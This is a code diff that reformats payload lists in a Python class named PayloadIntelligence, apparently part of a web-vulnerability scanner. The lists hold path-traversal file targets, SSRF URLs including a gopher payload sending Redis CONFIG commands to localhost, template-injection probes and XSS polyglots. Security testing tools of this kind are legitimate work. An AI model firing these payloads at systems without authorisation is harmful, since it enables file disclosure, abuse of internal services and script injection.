@@ -27,7 +27,7 @@ class PayloadIntelligence:
         "..\\..\\..\\..\\Windows\\win.ini",
         "/proc/self/environ",
         "/var/log/apache2/access.log",
-        "php://filter/convert.base64-encode/resource=index.php"
+        "php://filter/convert.base64-encode/resource=index.php",
     ]
 
     SSRF_PAYLOADS = [
@@ -38,10 +38,7 @@ class PayloadIntelligence:
         "http://10.0.0.1:22",
         "file:///etc/passwd",
         "dict://127.0.0.1:6379/",
-        (
-            "gopher://127.0.0.1:6379/_*1%0d%0a$7%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir"
-            "%0d%0a$4%0d%0a/tmp/%0d%0a"
-        )
+        ("gopher://127.0.0.1:6379/_*1%0d%0a$7%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$4%0d%0a/tmp/%0d%0a"),
     ]
 
     SSTI_PAYLOADS = [
@@ -52,7 +49,7 @@ class PayloadIntelligence:
         "*{7*7}",
         "{{self}}",
         "{{config.items()}}",
-        "{{[].__class__.__base__.__subclasses__()}}"
+        "{{[].__class__.__base__.__subclasses__()}}",
     ]
 
     @staticmethod
@@ -68,9 +65,9 @@ class PayloadIntelligence:
         """Polyglot payloads that work in multiple contexts."""
         return [
             (
-                "jaVasCript:/*-/*`/*\\\"/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//"
+                'jaVasCript:/*-/*`/*\\"/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//'
                 "</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()>\\x3e"
             ),
             "'\"><svg/onload=alert(1)>",
-            "javascript:alert(1)//"
+            "javascript:alert(1)//",
         ]
